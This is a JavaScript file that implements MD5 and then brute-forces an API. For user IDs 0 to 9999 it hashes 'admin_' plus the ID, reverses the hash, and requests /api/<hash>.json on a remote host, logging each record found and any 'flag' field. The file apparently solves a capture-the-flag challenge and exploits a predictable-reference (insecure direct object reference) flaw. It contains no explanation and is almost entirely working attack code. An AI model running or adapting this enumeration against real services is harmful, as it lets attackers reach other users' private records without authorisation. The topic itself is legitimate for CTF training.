function safeAdd(x, y) {
    let lsw = (x & 0xffff) + (y & 0xffff);
    let msw = (x >> 16) + (y >> 16) + (lsw >> 16);
    return (msw << 16) | (lsw & 0xffff)
}

function bitRotateLeft(num, cnt) {
    return (num << cnt) | (num >>> (32 - cnt))
}

function hashCmn(q, a, b, x, s, t) {
    return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b)
}

function hashFF(a, b, c, d, x, s, t) {
    return hashCmn((b & c) | (~b & d), a, b, x, s, t)
}

function hashGG(a, b, c, d, x, s, t) {
    return hashCmn((b & d) | (c & ~d), a, b, x, s, t)
}

function hashHH(a, b, c, d, x, s, t) {
    return hashCmn(b ^ c ^ d, a, b, x, s, t)
}

function hashII(a, b, c, d, x, s, t) {
    return hashCmn(c ^ (b | ~d), a, b, x, s, t)
}

function binlHash(x, len) {
    x[len >> 5] |= 0x80 << len % 32
    x[(((len + 64) >>> 9) << 4) + 14] = len

    let i, olda, oldb, oldc, oldd, a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;

    for (i = 0; i < x.length; i += 16) {
        olda = a; oldb = b; oldc = c; oldd = d;

        a = hashFF(a, b, c, d, x[i], 7, -680876936);
        d = hashFF(d, a, b, c, x[i + 1], 12, -389564586);
        c = hashFF(c, d, a, b, x[i + 2], 17, 606105819);
        b = hashFF(b, c, d, a, x[i + 3], 22, -1044525330);
        a = hashFF(a, b, c, d, x[i + 4], 7, -176418897);
        d = hashFF(d, a, b, c, x[i + 5], 12, 1200080426);
        c = hashFF(c, d, a, b, x[i + 6], 17, -1473231341);
        b = hashFF(b, c, d, a, x[i + 7], 22, -45705983);
        a = hashFF(a, b, c, d, x[i + 8], 7, 1770035416);
        d = hashFF(d, a, b, c, x[i + 9], 12, -1958414417);
        c = hashFF(c, d, a, b, x[i + 10], 17, -42063);
        b = hashFF(b, c, d, a, x[i + 11], 22, -1990404162);
        a = hashFF(a, b, c, d, x[i + 12], 7, 1804603682);
        d = hashFF(d, a, b, c, x[i + 13], 12, -40341101);
        c = hashFF(c, d, a, b, x[i + 14], 17, -1502002290);
        b = hashFF(b, c, d, a, x[i + 15], 22, 1236535329);

        a = hashGG(a, b, c, d, x[i + 1], 5, -165796510);
        d = hashGG(d, a, b, c, x[i + 6], 9, -1069501632);
        c = hashGG(c, d, a, b, x[i + 11], 14, 643717713);
        b = hashGG(b, c, d, a, x[i], 20, -373897302);
        a = hashGG(a, b, c, d, x[i + 5], 5, -701558691);
        d = hashGG(d, a, b, c, x[i + 10], 9, 38016083);
        c = hashGG(c, d, a, b, x[i + 15], 14, -660478335);
        b = hashGG(b, c, d, a, x[i + 4], 20, -405537848);
        a = hashGG(a, b, c, d, x[i + 9], 5, 568446438);
        d = hashGG(d, a, b, c, x[i + 14], 9, -1019803690);
        c = hashGG(c, d, a, b, x[i + 3], 14, -187363961);
        b = hashGG(b, c, d, a, x[i + 8], 20, 1163531501);
        a = hashGG(a, b, c, d, x[i + 13], 5, -1444681467);
        d = hashGG(d, a, b, c, x[i + 2], 9, -51403784);
        c = hashGG(c, d, a, b, x[i + 7], 14, 1735328473);
        b = hashGG(b, c, d, a, x[i + 12], 20, -1926607734);

        a = hashHH(a, b, c, d, x[i + 5], 4, -378558);
        d = hashHH(d, a, b, c, x[i + 8], 11, -2022574463);
        c = hashHH(c, d, a, b, x[i + 11], 16, 1839030562);
        b = hashHH(b, c, d, a, x[i + 14], 23, -35309556);
        a = hashHH(a, b, c, d, x[i + 1], 4, -1530992060);
        d = hashHH(d, a, b, c, x[i + 4], 11, 1272893353);
        c = hashHH(c, d, a, b, x[i + 7], 16, -155497632);
        b = hashHH(b, c, d, a, x[i + 10], 23, -1094730640);
        a = hashHH(a, b, c, d, x[i + 13], 4, 681279174);
        d = hashHH(d, a, b, c, x[i], 11, -358537222);
        c = hashHH(c, d, a, b, x[i + 3], 16, -722521979);
        b = hashHH(b, c, d, a, x[i + 6], 23, 76029189);
        a = hashHH(a, b, c, d, x[i + 9], 4, -640364487);
        d = hashHH(d, a, b, c, x[i + 12], 11, -421815835);
        c = hashHH(c, d, a, b, x[i + 15], 16, 530742520);
        b = hashHH(b, c, d, a, x[i + 2], 23, -995338651);

        a = hashII(a, b, c, d, x[i], 6, -198630844);
        d = hashII(d, a, b, c, x[i + 7], 10, 1126891415);
        c = hashII(c, d, a, b, x[i + 14], 15, -1416354905);
        b = hashII(b, c, d, a, x[i + 5], 21, -57434055);
        a = hashII(a, b, c, d, x[i + 12], 6, 1700485571);
        d = hashII(d, a, b, c, x[i + 3], 10, -1894986606);
        c = hashII(c, d, a, b, x[i + 10], 15, -1051523);
        b = hashII(b, c, d, a, x[i + 1], 21, -2054922799);
        a = hashII(a, b, c, d, x[i + 8], 6, 1873313359);
        d = hashII(d, a, b, c, x[i + 15], 10, -30611744);
        c = hashII(c, d, a, b, x[i + 6], 15, -1560198380);
        b = hashII(b, c, d, a, x[i + 13], 21, 1309151649);
        a = hashII(a, b, c, d, x[i + 4], 6, -145523070);
        d = hashII(d, a, b, c, x[i + 11], 10, -1120210379);
        c = hashII(c, d, a, b, x[i + 2], 15, 718787259);
        b = hashII(b, c, d, a, x[i + 9], 21, -343485551);

        a = safeAdd(a, olda);
        b = safeAdd(b, oldb);
        c = safeAdd(c, oldc);
        d = safeAdd(d, oldd);
    }
    return [a, b, c, d];
}

function binl2rstr(input) {
    let i, output = '', length32 = input.length * 32;
    for (i = 0; i < length32; i += 8) {
        output += String.fromCharCode((input[i >> 5] >>> i % 32) & 0xff);
    }
    return output
}

function rstr2binl(input) {
    let i, output = [];
    output[(input.length >> 2) - 1] = undefined;
    for (i = 0; i < output.length; i += 1) {
        output[i] = 0;
    }
    let length8 = input.length * 8;
    for (i = 0; i < length8; i += 8) {
        output[i >> 5] |= (input.charCodeAt(i / 8) & 0xff) << i % 32;
    }
    return output;
}

function rstr2hex(input) {
    let hexTab = '0123456789abcdef', output = '', x, i;
    for (i = 0; i < input.length; i += 1) {
        let x = input.charCodeAt(i)
        output += hexTab.charAt((x >>> 4) & 0x0f) + hexTab.charAt(x & 0x0f)
    }
    return output
}

function hash(string) {
    string = unescape(encodeURIComponent(string));
    return rstr2hex(binl2rstr(binlHash(rstr2binl(string), string.length * 8)))
}

const fetch = require("node-fetch");
const sleep = require("sleep");

userName = "admin";
function brute(startId) {
    for (let userId = startId; userId < startId+10000; userId++) {
        let userRef = hash(userName + "_" + userId).split("").reverse().join("");
        fetch('https://cfta-wm02.allyourbases.co/api/' + userRef + '.json')
            .then(response => {
                // console.log(response);
                if (response.ok) return response.json();
            })
            .then(json => {
                if (!json) {
                    if (userId % 100 == 0) console.log(userId);
                    return;
                }
                console.log(json);
                console.log("User ID " + userId);
                console.log("Hello " + userName + "!");
                if ("undefined" !== typeof json.flag) {
                    console.log(json.flag)
                }
            })
    }
}

brute(0);